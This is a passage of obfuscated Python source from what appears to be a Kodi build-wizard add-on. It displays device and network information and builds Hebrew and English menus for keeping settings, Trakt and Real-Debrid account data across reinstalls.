	O0O0OOO00OOOO00OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2759
	OO0OO0O00O0O000OO =[];O0O0O0O0O0OOOO0OO =0 #line:2760
	for O0O00O00O0O00OO0O in O0O0OOO00OOOO00OO :#line:2761
		O0O00OOOO0OOO0O00 =wiz .getInfo (O0O00O00O0O00OO0O )#line:2762
		OOO0O000OOOOOOO00 =0 #line:2763
		while O0O00OOOO0OOO0O00 =="Busy"and OOO0O000OOOOOOO00 <10 :#line:2764
			O0O00OOOO0OOO0O00 =wiz .getInfo (O0O00O00O0O00OO0O );OOO0O000OOOOOOO00 +=1 ;wiz .log ("%s sleep %s"%(O0O00O00O0O00OO0O ,str (OOO0O000OOOOOOO00 )));xbmc .sleep (1000 )#line:2765
		OO0OO0O00O0O000OO .append (O0O00OOOO0OOO0O00 )#line:2766
		O0O0O0O0O0OOOO0OO +=1 #line:2767
	OOO000OO0OO0O00OO =OO0OO0O00O0O000OO [8 ]if 'Una'in OO0OO0O00O0O000OO [8 ]else wiz .convertSize (int (float (OO0OO0O00O0O000OO [8 ][:-8 ]))*1024 *1024 )#line:2768
	O0000OOOOOOO0OOOO =OO0OO0O00O0O000OO [9 ]if 'Una'in OO0OO0O00O0O000OO [9 ]else wiz .convertSize (int (float (OO0OO0O00O0O000OO [9 ][:-8 ]))*1024 *1024 )#line:2769
	O0OO00OO000000000 =OO0OO0O00O0O000OO [10 ]if 'Una'in OO0OO0O00O0O000OO [10 ]else wiz .convertSize (int (float (OO0OO0O00O0O000OO [10 ][:-8 ]))*1024 *1024 )#line:2770
	O0OOO0000O0000OO0 =wiz .convertSize (int (float (OO0OO0O00O0O000OO [11 ][:-2 ]))*1024 *1024 )#line:2771
	O0O0OOO0000O000OO =wiz .convertSize (int (float (OO0OO0O00O0O000OO [12 ][:-2 ]))*1024 *1024 )#line:2772
	O0O0OOO0000000000 =wiz .convertSize (int (float (OO0OO0O00O0O000OO [13 ][:-2 ]))*1024 *1024 )#line:2773
	OO000000O0OOO0OOO ,O0OOO0OO0OOO000O0 ,O0OO000OOO0O0000O =getIP ()#line:2774
	OOO0O0O0OOO0OO0O0 =[];OO00O0O0000O00OO0 =[];O00O000O000000O0O =[];O0OO0OOO0OO0OOO00 =[];O00OOO0O0OO00O0O0 =[];OO0OO00O0O0O00O00 =[];OO0OO0OO0O00000O0 =[]#line:2776
	O000O0O00O0O00OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:2778
	for O00OO00O000O0O0O0 in sorted (O000O0O00O0O00OOO ,key =lambda O0O00O00O0OO00OOO :O0O00O00O0OO00OOO ):#line:2779
		OOO00OOOO000O000O =os .path .split (O00OO00O000O0O0O0 [:-1 ])[1 ]#line:2780
		if OOO00OOOO000O000O =='packages':continue #line:2781
		OO00O0000O0000OOO =os .path .join (O00OO00O000O0O0O0 ,'addon.xml')#line:2782
		if os .path .exists (OO00O0000O0000OOO ):#line:2783
			O0OO00OOOO0O00000 =open (OO00O0000O0000OOO )#line:2784
			OO00O000O000000O0 =O0OO00OOOO0O00000 .read ()#line:2785
			OO0O0000OO00O0O0O =re .compile ("<provides>(.+?)</provides>").findall (OO00O000O000000O0 )#line:2786
			if len (OO0O0000OO00O0O0O )==0 :#line:2787
				if OOO00OOOO000O000O .startswith ('skin'):OO0OO0OO0O00000O0 .append (OOO00OOOO000O000O )#line:2788
				if OOO00OOOO000O000O .startswith ('repo'):O00OOO0O0OO00O0O0 .append (OOO00OOOO000O000O )#line:2789
				else :OO0OO00O0O0O00O00 .append (OOO00OOOO000O000O )#line:2790
			elif not (OO0O0000OO00O0O0O [0 ]).find ('executable')==-1 :O0OO0OOO0OO0OOO00 .append (OOO00OOOO000O000O )#line:2791
			elif not (OO0O0000OO00O0O0O [0 ]).find ('video')==-1 :O00O000O000000O0O .append (OOO00OOOO000O000O )#line:2792
			elif not (OO0O0000OO00O0O0O [0 ]).find ('audio')==-1 :OO00O0O0000O00OO0 .append (OOO00OOOO000O000O )#line:2793
			elif not (OO0O0000OO00O0O0O [0 ]).find ('image')==-1 :OOO0O0O0OOO0OO0O0 .append (OOO00OOOO000O000O )#line:2794
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2796
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2797
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2798
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2799
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2800
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2801
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2803
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2804
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2805
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2807
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000OO0OO0O00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2808
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OOOOOOO0OOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2809
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00OO000000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2810
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2812
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0000O0000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2813
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOO0000O000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2814
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOO0000000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2815
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2817
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2818
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000000O0OOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2819
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0OO0OOO000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2820
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000OOO0O0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2821
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O00O0O000OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2822
	OOO00OOOO00000OOO =len (OOO0O0O0OOO0OO0O0 )+len (OO00O0O0000O00OO0 )+len (O00O000O000000O0O )+len (O0OO0OOO0OO0OOO00 )+len (OO0OO00O0O0O00O00 )+len (OO0OO0OO0O00000O0 )+len (O00OOO0O0OO00O0O0 )#line:2824
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOO00OOOO00000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2825
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O000O000000O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2826
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0OOO0OO0OOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2827
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O0O0000O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2828
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O0O0OOO0OO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2829
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO0O0OO00O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2830
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0OO0O00000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2831
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO00O0O0O00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2832
def Menu ():#line:2833
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2834
def saveMenu ():#line:2836
	OOOOO0000OO00O0O0 ='[COLOR green]מופעל[/COLOR]';OOOOOOO0O00OO000O ='[COLOR red]מבוטל[/COLOR]'#line:2838
	OOOO000O00O0OOO00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2839
	O0O0OOOOO0OOOOOO0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2840
	O0OO0OO00OO00OOOO ='true'if KEEPINFO =='true'else 'false'#line:2841
	OOOOO0O0OO0OO0000 ='true'if KEEPSOUND =='true'else 'false'#line:2843
	O0OO00OO0OO000O0O ='true'if KEEPVIEW =='true'else 'false'#line:2844
	O000O0OO0OO0O000O ='true'if KEEPSKIN =='true'else 'false'#line:2845
	O00OOO000O0O000OO ='true'if KEEPSKIN2 =='true'else 'false'#line:2846
	OO0OO000O0OO0O00O ='true'if KEEPSKIN3 =='true'else 'false'#line:2847
	OO000OO000O0O0O0O ='true'if KEEPADDONS =='true'else 'false'#line:2848
	OOOO0000000OO00OO ='true'if KEEPPVR =='true'else 'false'#line:2849
	OOO00O0O0O0O0O0OO ='true'if KEEPTVLIST =='true'else 'false'#line:2850
	OO00000OOO0O0OO00 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2851
	O0O00O000000O0OOO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2852
	O00O0OO0OOO000000 ='true'if KEEPHUBTV =='true'else 'false'#line:2853
	OO0OOO0000O0O00O0 ='true'if KEEPHUBVOD =='true'else 'false'#line:2854
	O0O00OOOOOOOOOOOO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2855
	O00000OO000O00OO0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2856
	OOOOOO0000OO0OO0O ='true'if KEEPHUBMENU =='true'else 'false'#line:2857
	O0OOOO000O0OOOOOO ='true'if KEEPPLAYLIST =='true'else 'false'#line:2858
	O0O00OOO00OO00000 ='true'if KEEPTRAKT =='true'else 'false'#line:2859
	OO0OO00OOOOOO000O ='true'if KEEPREAL =='true'else 'false'#line:2860
	O00000O0000O00000 ='true'if KEEPRD2 =='true'else 'false'#line:2861
	O0000OOOOOOOO0O0O ='true'if KEEPTORNET =='true'else 'true'#line:2862
	OO00O00O0OO00OOOO ='true'if KEEPLOGIN =='true'else 'false'#line:2863
	OO00OO0OO0OO00OOO ='true'if KEEPSOURCES =='true'else 'false'#line:2864
	O0O00OOO00O0OO0O0 ='true'if KEEPADVANCED =='true'else 'false'#line:2865
	O00OOOO0O0O0O0OOO ='true'if KEEPPROFILES =='true'else 'false'#line:2866
	O000OOOO0O0OO00OO ='true'if KEEPFAVS =='true'else 'false'#line:2867
	OOOOOOOO00OOO0O0O ='true'if KEEPREPOS =='true'else 'false'#line:2868
	O0O0OOO00O0000OOO ='true'if KEEPSUPER =='true'else 'false'#line:2869
	O00O0OOOOOOO0OO0O ='true'if KEEPWHITELIST =='true'else 'false'#line:2870
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2874
	if O00O0OOOOOOO0OO0O =='true':#line:2875
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2876
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2877
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2878
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2879
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2880
	addFile ('%s התקנת קיר סרטים: '%OOOO000O00O0OOO00 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2882
	addFile ('%s שמירת חשבון RD: '%OO0OO00OOOOOO000O .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2883
	addFile ('%s שמירת חשבון טראקט: '%O0O00OOO00OO00000 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2884
	addFile ('%s שמירת מועדפים: '%O000OOOO0O0OO00OO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2887
	addFile ('%s שמירת לקוח טלוויזיה: '%OOOO0000000OO00OO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2888
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OOO00O0O0O0O0O0OO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2889
	addFile ('%s שמירת אריח סרטים: '%OO00000OOO0O0OO00 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2890
	addFile ('%s שמירת אריח סדרות: '%O0O00O000000O0OOO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2891
	addFile ('%s שמירת אריח טלויזיה: '%O00O0OO0OOO000000 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2892
	addFile ('%s שמירת אריח תוכן ישראלי: '%OO0OOO0000O0O00O0 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2893
	addFile ('%s שמירת אריח ילדים: '%O0O00OOOOOOOOOOOO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2894
	addFile ('%s שמירת אריח מוסיקה: '%O00000OO000O00OO0 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2895
	addFile ('%s שמירת תפריט אריחים ראשי: '%OOOOOO0000OO0OO0O .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2896
	addFile ('%s שמירת כל האריחים בסקין: '%O000O0OO0OO0O000O .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2897
	addFile ('%s שמירת הרחבות שהתקנתי: '%OO000OO000O0O0O0O .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2904
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%O0OO0OO00OO00OOOO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2905
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O0O0OOOOO0OOOOOO0 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2908
	addFile ('%s שמירת מקורות וידאו: '%OO00OO0OO0OO00OOO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2909
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OOOOO0O0OO0OO0000 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2910
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O0OO00OO0OO000O0O .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2912
	addFile ('%s שמירת פליליסט לאודר: '%O0OOOO000O0OOOOOO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2913
	addFile ('%s שמירת הרחבות ידנית: '%O00O0OOOOOOO0OO0O .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2914
	addFile ('%s שמירת הגדרות באפר: '%O0O00OOO00O0OO0O0 .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2918
	addFile ('%s שמירת סופר מועדפים: '%O0O0OOO00O0000OOO .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2919
	addFile ('%s שמירת רשימות ריפו: '%OOOOOOOO00OOO0O0O .replace ('true',OOOOO0000OO00O0O0 ).replace ('false',OOOOOOO0O00OO000O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2920
	setView ('files','viewType')#line:2922
def traktMenu ():#line:2924
	O0000OO00O0OOO0OO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2925
	O0O00O000O0OOOO00 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2926
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2927
	addFile ('Save Trakt Data: %s'%O0000OO00O0OOO0OO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2928
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0O00O000O0OOOO00 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2929
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2930
	for O0000OO00O0OOO0OO in traktit .ORDER :#line:2932
		OOOO00O00OO000O0O =TRAKTID [O0000OO00O0OOO0OO ]['name']#line:2933
		O000O00000OOO0OOO =TRAKTID [O0000OO00O0OOO0OO ]['path']#line:2934
		OOO0OOO000000O0O0 =TRAKTID [O0000OO00O0OOO0OO ]['saved']#line:2935
		O0000O000O00OOOOO =TRAKTID [O0000OO00O0OOO0OO ]['file']#line:2936
		O0O0O0OO0O0OOO0O0 =wiz .getS (OOO0OOO000000O0O0 )#line:2937
		O00000O0OO000O00O =traktit .traktUser (O0000OO00O0OOO0OO )#line:2938
		OOOOO00O0OOOOO0O0 =TRAKTID [O0000OO00O0OOO0OO ]['icon']if os .path .exists (O000O00000OOO0OOO )else ICONTRAKT #line:2939
		O00OOO00O000O0O00 =TRAKTID [O0000OO00O0OOO0OO ]['fanart']if os .path .exists (O000O00000OOO0OOO )else FANART #line:2940
		OO0O000OO0OO0O0OO =createMenu ('saveaddon','Trakt',O0000OO00O0OOO0OO )#line:2941
		OO00O0OO0O0O00O0O =createMenu ('save','Trakt',O0000OO00O0OOO0OO )#line:2942
		OO0O000OO0OO0O0OO .append ((THEME2 %'%s Settings'%OOOO00O00OO000O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0000OO00O0OOO0OO )))#line:2943
		addFile ('[+]-> %s'%OOOO00O00OO000O0O ,'',icon =OOOOO00O0OOOOO0O0 ,fanart =O00OOO00O000O0O00 ,themeit =THEME3 )#line:2945
		if not os .path .exists (O000O00000OOO0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOO00O0OOOOO0O0 ,fanart =O00OOO00O000O0O00 ,menu =OO0O000OO0OO0O0OO )#line:2946
		elif not O00000O0OO000O00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0000OO00O0OOO0OO ,icon =OOOOO00O0OOOOO0O0 ,fanart =O00OOO00O000O0O00 ,menu =OO0O000OO0OO0O0OO )#line:2947
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00000O0OO000O00O ,'authtrakt',O0000OO00O0OOO0OO ,icon =OOOOO00O0OOOOO0O0 ,fanart =O00OOO00O000O0O00 ,menu =OO0O000OO0OO0O0OO )#line:2948
		if O0O0O0OO0O0OOO0O0 =="":#line:2949
			if os .path .exists (O0000O000O00OOOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0000OO00O0OOO0OO ,icon =OOOOO00O0OOOOO0O0 ,fanart =O00OOO00O000O0O00 ,menu =OO00O0OO0O0O00O0O )#line:2950
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0000OO00O0OOO0OO ,icon =OOOOO00O0OOOOO0O0 ,fanart =O00OOO00O000O0O00 ,menu =OO00O0OO0O0O00O0O )#line:2951
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O0OO0O0OOO0O0 ,'',icon =OOOOO00O0OOOOO0O0 ,fanart =O00OOO00O000O0O00 ,menu =OO00O0OO0O0O00O0O )#line:2952
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2954
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2955
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2956
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2957
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2958
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2959
	setView ('files','viewType')#line:2960
def realMenu ():#line:2962
	OO0O0OOOOOO0O0O00 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2963
	O0OOOOO0O0O0O0O00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2964
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2965
	addFile ('Save Real Debrid Data: %s'%OO0O0OOOOOO0O0O00 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2966
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OOOOO0O0O0O0O00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2967
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2968
	for OO0O000OO0OOO0OO0 in debridit .ORDER :#line:2970
		O00O000OO0OO00OOO =DEBRIDID [OO0O000OO0OOO0OO0 ]['name']#line:2971
		OOO0OO000OO000OO0 =DEBRIDID [OO0O000OO0OOO0OO0 ]['path']#line:2972
		OOO00O0O0000OOOOO =DEBRIDID [OO0O000OO0OOO0OO0 ]['saved']#line:2973
		OO000O00OOO0O0000 =DEBRIDID [OO0O000OO0OOO0OO0 ]['file']#line:2974
		OO00O00O0OOOO00O0 =wiz .getS (OOO00O0O0000OOOOO )#line:2975
		O00OOO00O0OO000O0 =debridit .debridUser (OO0O000OO0OOO0OO0 )#line:2976
		O0O00OOOO00OOOOOO =DEBRIDID [OO0O000OO0OOO0OO0 ]['icon']if os .path .exists (OOO0OO000OO000OO0 )else ICONREAL #line:2977
		O00O0O0OO00OO0OO0 =DEBRIDID [OO0O000OO0OOO0OO0 ]['fanart']if os .path .exists (OOO0OO000OO000OO0 )else FANART #line:2978
		OO00000O000OO00OO =createMenu ('saveaddon','Debrid',OO0O000OO0OOO0OO0 )#line:2979
		OOO000OO00O00OOOO =createMenu ('save','Debrid',OO0O000OO0OOO0OO0 )#line:2980
		OO00000O000OO00OO .append ((THEME2 %'%s Settings'%O00O000OO0OO00OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OO0O000OO0OOO0OO0 )))#line:2981
		addFile ('[+]-> %s'%O00O000OO0OO00OOO ,'',icon =O0O00OOOO00OOOOOO ,fanart =O00O0O0OO00OO0OO0 ,themeit =THEME3 )#line:2983
		if not os .path .exists (OOO0OO000OO000OO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O00OOOO00OOOOOO ,fanart =O00O0O0OO00OO0OO0 ,menu =OO00000O000OO00OO )#line:2984
		elif not O00OOO00O0OO000O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OO0O000OO0OOO0OO0 ,icon =O0O00OOOO00OOOOOO ,fanart =O00O0O0OO00OO0OO0 ,menu =OO00000O000OO00OO )#line:2985
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OOO00O0OO000O0 ,'authdebrid',OO0O000OO0OOO0OO0 ,icon =O0O00OOOO00OOOOOO ,fanart =O00O0O0OO00OO0OO0 ,menu =OO00000O000OO00OO )#line:2986
		if OO00O00O0OOOO00O0 =="":#line:2987
			if os .path .exists (OO000O00OOO0O0000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OO0O000OO0OOO0OO0 ,icon =O0O00OOOO00OOOOOO ,fanart =O00O0O0OO00OO0OO0 ,menu =OOO000OO00O00OOOO )#line:2988
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OO0O000OO0OOO0OO0 ,icon =O0O00OOOO00OOOOOO ,fanart =O00O0O0OO00OO0OO0 ,menu =OOO000OO00O00OOOO )#line:2989
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO00O00O0OOOO00O0 ,'',icon =O0O00OOOO00OOOOOO ,fanart =O00O0O0OO00OO0OO0 ,menu =OOO000OO00O00OOOO )#line:2990
